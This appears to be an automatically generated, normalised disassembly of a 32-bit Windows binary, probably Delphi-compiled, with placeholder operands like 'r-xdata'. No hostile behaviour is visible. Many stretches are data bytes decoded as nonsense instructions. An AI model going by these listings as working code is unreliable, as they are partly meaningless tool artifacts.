mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_41311c
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_413144
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_413180
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] ecx
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov ebx edx
and ebx 0xffffff
add ebx eax
mov eax [ esp ]
mov edx [ ebx ]
call sub_4061ac
jmp r-xdata
mov [ esp + 0x4 ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0x4 ] edx
jmp r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx esi
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
jmp r-xdata
mov [ esp + 0x8 ] eax
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_413200
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4061ac
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_413274
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4132ba
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4132c1
retn
mov eax rw-data
call sub_40442c
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404f0c
sub_4132cc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4132f1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4132f8
retn
sub_41453a
inc ecx
add [ ecx + esi * 8 + 0x41 ] dh
add [ esi ] cl
push esp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esi eax
inc esi
inc ecx
add [ eax + eax ] bh
shr ah 0x46
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
inc edi
inc ecx
add [ eax + eax ] cl
add [ ebp + eax * 2 + 0x39080041 ] ch
inc eax
add [ ecx + edi ] dl
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x6fffbe41 ] dh
rol [ ecx ] 0xe8
mov edi 0xc0100041
inc ecx
add [ eax + eax * 8 + 0x41 ] cl
add ah al
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc esi
inc ecx
add [ eax ] ch
add [ eax ] al
add al bl
adc [ eax ] al
or [ ecx ] bh
inc eax
add [ ecx + edi ] dl
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add al ah
xchg edx eax
inc ecx
add [ eax ] cl
xchg ebx eax
inc ecx
add al ch
sub al [ eax ]
call 0xffffffffe841862f
sub al [ eax ]
push es
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0x41465c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 2 + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
inc ebp
inc ecx
add [ eax ] bl
add [ eax ] al
add al cl
adc [ eax ] eax
or [ ecx ] bh
inc eax
add [ eax ] dl
bound eax [ eax ]
sbb al 0x62
inc eax
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
sub al 0x62
inc eax
add [ esi + esi + 0x40 ] dh
add al bl
in al dx
inc ecx
add [ eax ] dl
in eax dx
inc ecx
add [ eax - 0x13 ] bh
inc ecx
add al ah
in eax dx
inc ecx
add [ esi + ebp * 8 + 0x41 ] ah
add al cl
out dx al
inc ecx
add al cl
pushfd
inc ebp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + eax * 2 + 0x80041 ] bl
add [ eax ] al
fcom [ eax ]
inc eax
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x55 ] dh
inc ecx
add [ esp + edx * 2 ] cl
inc ebx
insb
popad
jae r-xdata
add [ ebp + eax * 2 + 0x39080041 ] ch
inc eax
add [ ecx + edi ] dl
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x8004199 ] cl
xchg ebx eax
inc ecx
add al ch
cdq
inc ecx
add [ edx + ebx * 4 ] bl
inc ecx
add [ eax ] dh
popfd
inc ecx
add [ ebx + ebx * 4 ] cl
inc ecx
add [ edx + edi * 4 + 0x41 ] al
add [ ebx + ebx * 4 ] ch
inc ecx
add [ ebx + edi * 4 ] dl
inc ecx
add ah bh
mov edx 0xa8b80041
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x700040 ] ch
add [ eax ] al
pop es
push esp
push edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ esi + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x7c004146 ] dl
add [ eax ] al
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add al bh
inc ebp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4146fe
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2c0040 ] ch
add [ eax ] al
pop es
push esp
push edi
jb r-xdata
dec esi
je r-xdata
inc esp
and al 0x4
aam 0xe9
mov esp [ ecx - 0x33340000 ]
int3
jns r-xdata
outsb
jb r-xdata
add [ ebx - 0x2bfbdbbc ] al
mov eax [ esp + 0x4 ]
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e80115
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
jae r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
popad
insd
mov [ gs : edi + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
inc edi
inc ecx
add [ eax + eax ] cl
add [ ebp + eax * 2 + 0x39080041 ] ch
inc eax
add [ ecx + edi ] dl
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x6fffbe41 ] dh
rol [ ecx ] 0xe8
mov edi 0xc0100041
inc ecx
add [ eax + eax * 8 + 0x41 ] cl
add ah al
retn
shr [ eax + 0x47 ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x47 ] ch
inc ecx
add [ eax + eax ] cl
add [ eax ] al
push esp
jns r-xdata
add [ edx ] al
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
je r-xdata
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x7004036 ] dh
inc ebp
push esp
push 0x64616572
je r-xdata
dec [ ebx - 0x3f7c3340 ]
fsubr st1
out dx eax
mov eax [ 0x44830000 ]
and al 0x4
fmul [ ebx - 0x74fbdbbc ]
add bh bh
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
inc ecx
add [ edx ] cl
push cs
push esp
inc ebx
outsd
insd
jo r-xdata
pop ebp
retn 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
aam 0x8b
inc esp
and al 0x4
je r-xdata
outsb
outsb
sub_414a36
arpl [ ecx + 0x63 ] ax
je r-xdata
add al 0xe6
inc ecx
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add ah cl
0xec300041 0x41
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x9000408d
dec edx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
dec edx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
dec edx
inc ecx
add al ah
dec edx
inc ecx
add [ eax + eax ] dl
add [ eax + ecx * 2 + 0x41 ] ah
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] dl
jmp r-xdata
insb
jmp sub_414b14
sub_414a8f
add [ eax + 0x6b ] ch
inc ecx
add [ 0x6a840041 ] bl
inc ecx
add ah dh
in eax 0x41
add [ eax - 0x15 ] dh
inc ecx
add [ esi ] al
inc ecx
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add ah cl
0xec300041 0x41
sub_414b14
add [ eax ] al
mov eax eax
sbb al 0x4b
inc ecx
add [ esi ] cl
push cs
push esp
dec ecx
outsb
je r-xdata
or al 0x50
popad
jo r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4068c0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
outsb
je r-xdata
inc ebp
or [ eax - 0x75 ] dl
iretd
jns r-xdata
adc [ eax ] al
add al 0x0
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
sub_414b3c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4068dc
pop edi
pop esi
pop ebx
retn
sub_414b64
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4068c0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_414b8c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406974
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_414ca0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4161a0
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_4038ec
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_4038ec
test al al
je r-xdata
sub_414d00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_414ca0
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_414ca0
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4038ec
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414d70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403690
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_416044
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_414dec
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
mov eax [ esi + 0x4 ]
call sub_4036c0
mov eax [ esi + 0x8 ]
call sub_4036c0
mov eax [ esi + 0xc ]
call sub_4036c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_414e2c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_4161a0
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_403624
test al al
jne r-xdata
sub_414e8c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_4161a0
mov edx eax
mov eax ebp
call sub_4038ec
test al al
jne r-xdata
sub_414ed0
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414f6b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403610
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404688
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_414e2c
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_416044
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f72
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c098
call sub_403e8c
sub_414f90
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405b18
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_414fb0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4161a0
mov edx edi
call sub_414f90
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4161a0
mov edx edi
call sub_414f90
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_416090
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_414f90
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_416090
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_415054
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_4161a0
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_414e8c
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_4150a0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_414d70
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_416044
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_415114
push ebx
push esi
push edi
push ebp
call sub_403a8c
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
mov eax [ esi + 0x4 ]
mov edx edi
call sub_4161a0
call sub_4036c0
inc edi
dec ebp
jne r-xdata
sub_415170
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_4161a0
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_414d00
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_4151b4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_414e2c
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_4161a0
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_4151f8
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_41527b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_403610
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfdc
call sub_403e8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415282
lea eax [ ebp - 0x10c ]
call sub_40442c
retn
sub_415288
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_415170
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_414c94
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_4151f8
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4161a0
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4161a0
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4038ec
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_415170
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_416090
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_416044
sub_415374
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4161a0
mov edx ebp
call sub_414f78
test al al
jne r-xdata
sub_4153b8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_414d70
mov edx eax
mov eax [ edi + 0x4 ]
call sub_416044
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4161a0
mov eax [ eax + 0xc ]
mov edx ebp
call sub_4161fc
test eax eax
jge r-xdata
sub_415414
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4161a0
mov edx edi
call sub_414fb0
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_415444
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403690
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_415350
xor eax eax
push ebp
push sub_415543
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41554a
mov eax [ rw-data ]
call sub_415408
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_416044
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4161a0
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_414e8c
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
